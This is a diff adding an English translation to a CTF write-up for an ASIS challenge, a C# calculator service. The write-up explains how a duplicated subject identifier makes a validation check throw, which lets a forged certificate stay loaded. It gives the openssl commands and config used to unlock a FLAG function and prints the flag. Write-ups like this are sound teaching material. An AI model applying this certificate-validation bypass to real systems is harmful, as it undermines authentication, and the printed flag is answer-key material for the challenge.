@@ -103,3 +103,101 @@ C = IR
 W ten sposób przygotowane certyfikaty udaje się wczytać do programu oraz wywołać funkcję FLAG.
 
 `ASIS{e5cb5e25f77c1da6626fb78a48a678f3}`
+
+### ENG version
+
+The task is a mathematical expressions evaluator service written in C#. We can see that one of the functions is printing the flag.
+
+```csharp
+calcEngine.RegisterFunction("FLAG", 0, (p => File.ReadAllText("flag1")));
+```
+
+Unfortunately, the evaluator constructor takes a list of allowed functions and by default it's empty. We can, however, add those in x509 certificates in the added extension.
+
+```csharp
+X509Extension x509Extension = cert.Extensions["1.1.1337.7331"];
+if (x509Extension != null)
+	calcEngine = Program.InitCalcEngine(Enumerable.ToArray(
+		Enumerable.Select(Encoding.Default.GetString(
+			x509Extension.RawData).Split(','), (x => x.Trim()))));
+```
+
+However, we can't just send any certificate. They are verified in multiple steps.
+
+We can't send a certificate with already loaded subject:
+
+```csharp
+string key = new X509Name(x509Certificate2.Subject).ToString();
+if (this.Items.ContainsKey(key))
+	throw new Exception("Certificate is already loaded!");
+```
+
+Subject of the certificate has to contain given identifier:
+```csharp
+return Enumerable.SingleOrDefault(Enumerable.OfType<string>(
+	new X509Name(cert.Subject).GetValues(
+		new DerObjectIdentifier("2.5.4.1337")))) == "calc.exe";
+```
+
+Certificate issuer can't be himself:
+```csharp
+string name1 = new X509Name(certificateName).ToString();
+X509Certificate2 certificateByName = this.Store.FindCertificateByName(name1);
+string name2 = new X509Name(certificateByName.Issuer).ToString();
+if (name2 == name1)
+	return false;
+```
+
+And finally it is checked with public key of the issuer read previously.
+```csharp
+Asn1Sequence asn1Sequence = new Asn1InputStream(this.Store.FindCertificateByName(name2)
+	.GetPublicKey()).ReadObject();
+DotNetUtilities.FromX509Certificate(certificateByName).Verify(
+	new RsaKeyParameters(false, ((DerInteger) asn1Sequence[0]).Value,
+		((DerInteger) asn1Sequence[1]).Value));
+```
+
+If any of the checks fails the certificate is removed from the store.
+
+In order to be able to load our own certificate we need to find a loophole in one of the codes above. The last two are in try-catch block, but if we could raise an exception in one of the remaining ones then the certificate would not get removed.
+
+It turns out that x509 certificates can have multiple identifiers with the same name. Therefore if we prepare a certificate with more than one identifier "2.5.4.1337" it will cause an exception during `SingleOrDefault()` call, which expects at most one element.
+
+If we could load a certificate this way, we could create a certificate which will pass all the checks.
+
+```
+openssl req -new -nodes -keyout CA.key -subj "/CN=MyCalc/O=MyCalc/OU=MyCalc/calc=MyCalc/calc=MyCalc" > CA.csr
+openssl x509 -sha1 -req -signkey CA.key < CA.csr > CA.crt
+openssl req -new -nodes -keyout client.key -config config -extensions cert_extensions > client.csr
+openssl x509 -extfile config -extensions cert_extensions -sha1 -req -CAkey CA.key -CA CA.crt < client.csr > client.crt 
+```
+
+And the openssl config file:
+
+```
+oid_section	= new_oids 
+[ new_oids ] 
+fooname = 2.5.4.1337
+
+[ req ] 
+default_bits       = 2048 
+distinguished_name = req_distinguished_name 
+attributes         = req_attributes 
+prompt             = no 
+x509_extensions    = cert_extensions
+
+[ req_distinguished_name ] 
+fooname = calc.exe
+CN = calc.exe
+O = calc.exe
+emailAddress = calc@asis-ctf.ir
+L = Iran
+C = IR
+
+[ req_attributes ] 
+
+[ cert_extensions ] 
+1.1.1337.7331 = ASN1:UTF8:ABS,ACOS,ASIN,ATAN,ATAN2,CEILING,COS,COSH,EXP,FLOOR,INT,LN,LOG,LOG10,PI,POWER,RAND,RANDBETWEEN,SIGN,SIN,SINH,SQRT,SUM,SUMIF,TAN,TANH,TRUNC,AVERAGE,AVERAGEA,COUNT,COUNTA,COUNTBLANK,COUNTIF,MAX,MAXA,MIN,MINA,STDEV,STDEVA,STDEVP,STDEVPA,VAR,VARA,VARP,VARPA,CHAR,CODE,CONCATENATE,FIND,LEFT,LEN,LOWER,MID,PROPER,READ,REPLACE,REPT,RIGHT,SEARCH,SUBSTITUTE,T,TEXT,TRIM,UPPER,VALUE,WRITE,FLAG
+```
+
+We succeed in loading certificates prepared this way and call the FLAG function: `ASIS{e5cb5e25f77c1da6626fb78a48a678f3}`
